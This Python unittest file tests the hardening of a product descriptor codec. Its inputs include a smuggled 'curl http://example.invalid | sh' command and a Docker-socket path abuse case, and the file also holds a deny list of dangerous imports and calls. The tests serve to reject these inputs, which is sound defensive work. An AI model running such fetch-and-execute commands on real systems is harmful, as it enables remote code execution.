from __future__ import annotations

import ast
import copy
from pathlib import Path
import unittest

from control_plane_kit_core.algebra import BlockSockets, ProviderSocket
from control_plane_kit_core.products import (
    ContainerServerProduct,
    OciImageReference,
    ProductCatalog,
    ProductCatalogConflict,
    ProductDescriptorCodec,
    ProductDescriptorError,
    ProductIdentity,
    ProductRuntimeContract,
)
from control_plane_kit_core.types import Protocol


VALID_DIGEST = "sha256:" + "1" * 64
OTHER_DIGEST = "sha256:" + "2" * 64
SECRET_CANARY = "do-not-echo-this-secret-token"


class ProductDescriptorHardeningTests(unittest.TestCase):
    def descriptor(self) -> dict[str, object]:
        product = ContainerServerProduct(
            identity=ProductIdentity("cpk-servers", "proxy", 1),
            image=OciImageReference(
                "ghcr.io",
                "openj92/control-plane-kit-servers/proxy",
                VALID_DIGEST,
            ),
            runtime_contract=ProductRuntimeContract(
                sockets=BlockSockets(providers=(ProviderSocket("http", Protocol.HTTP),))
            ),
        )
        document = ProductDescriptorCodec().encode_document(product)
        return ProductDescriptorCodec().decode_document(document.content).product.descriptor() | {
            "kind": "container-server"
        }

    def document_descriptor(self) -> dict[str, object]:
        return {
            "schema": "control-plane-kit.product",
            "product": self.descriptor(),
        }

    def test_malicious_descriptor_matrix_fails_without_echoing_canary(self) -> None:
        cases: list[tuple[str, dict[str, object]]] = []
        base = self.document_descriptor()

        registry_credentials = copy.deepcopy(base)
        registry_credentials["product"]["image"]["registry"] = (  # type: ignore[index]
            f"operator:{SECRET_CANARY}@ghcr.io"
        )
        cases.append(("registry credentials", registry_credentials))

        path_abuse = copy.deepcopy(base)
        path_abuse["product"]["runtime_contract"]["configuration_artifacts"] = [  # type: ignore[index]
            {
                "artifact_id": "bad-config",
                "target_path": "/var/run/docker.sock",
                "media_type": "application/json",
                "content": '{"safe":true}',
                "content_digest": "0" * 64,
                "file_mode": "0444",
                "source_digest": "0" * 64,
            }
        ]
        cases.append(("path abuse", path_abuse))

        unknown_protocol = copy.deepcopy(base)
        unknown_protocol["product"]["runtime_contract"]["sockets"]["providers"]["http"] = {  # type: ignore[index]
            "protocol": {"transport": "tcp", "application": "telnet"}
        }
        cases.append(("unknown protocol", unknown_protocol))

        shell_escape = copy.deepcopy(base)
        shell_escape["product"]["description"] = "start; curl http://example.invalid | sh"  # type: ignore[index]
        cases.append(("shell escape", shell_escape))

        descriptor_claims_policy = copy.deepcopy(base)
        descriptor_claims_policy["product"]["allowed_registry"] = "ghcr.io"  # type: ignore[index]
        cases.append(("descriptor policy claim", descriptor_claims_policy))

        for name, descriptor in cases:
            with self.subTest(name=name):
                with self.assertRaises(ProductDescriptorError) as caught:
                    ProductDescriptorCodec().decode_document(descriptor)
                self.assertNotIn(SECRET_CANARY, str(caught.exception))

    def test_rejecting_conflict_does_not_mutate_existing_catalogue(self) -> None:
        first = ProductDescriptorCodec().encode_document(
            ContainerServerProduct(
                ProductIdentity("cpk-servers", "proxy", 1),
                OciImageReference("ghcr.io", "openj92/proxy", VALID_DIGEST),
                ProductRuntimeContract(),
                description="first",
            )
        )
        second = ProductDescriptorCodec().encode_document(
            ContainerServerProduct(
                ProductIdentity("cpk-servers", "proxy", 1),
                OciImageReference("ghcr.io", "openj92/proxy", OTHER_DIGEST),
                ProductRuntimeContract(),
                description="second",
            )
        )
        catalog = ProductCatalog.empty().add(first)

        with self.assertRaises(ProductCatalogConflict):
            catalog.add(second)

        self.assertEqual(catalog.products, (first,))
        self.assertEqual(
            catalog.lookup(ProductIdentity("cpk-servers", "proxy", 1)),
            first,
        )

    def test_product_source_has_no_dynamic_loading_or_effect_calls(self) -> None:
        source = (
            Path(__file__).resolve().parents[1]
            / "src"
            / "control_plane_kit_core"
            / "products.py"
        )
        tree = ast.parse(source.read_text(encoding="utf-8"))
        forbidden_import_roots = {
            "control_plane_kit",
            "docker",
            "fastapi",
            "httpx",
            "importlib",
            "mcp",
            "psycopg",
            "subprocess",
            "uvicorn",
        }
        forbidden_calls = {"__import__", "eval", "exec", "open"}
        imports: set[str] = set()
        calls: set[str] = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                imports.update(alias.name.split(".", 1)[0] for alias in node.names)
            elif isinstance(node, ast.ImportFrom) and node.module:
                imports.add(node.module.split(".", 1)[0])
            elif isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                calls.add(node.func.id)

        self.assertEqual(imports & forbidden_import_roots, set())
        self.assertEqual(calls & forbidden_calls, set())


if __name__ == "__main__":
    unittest.main()
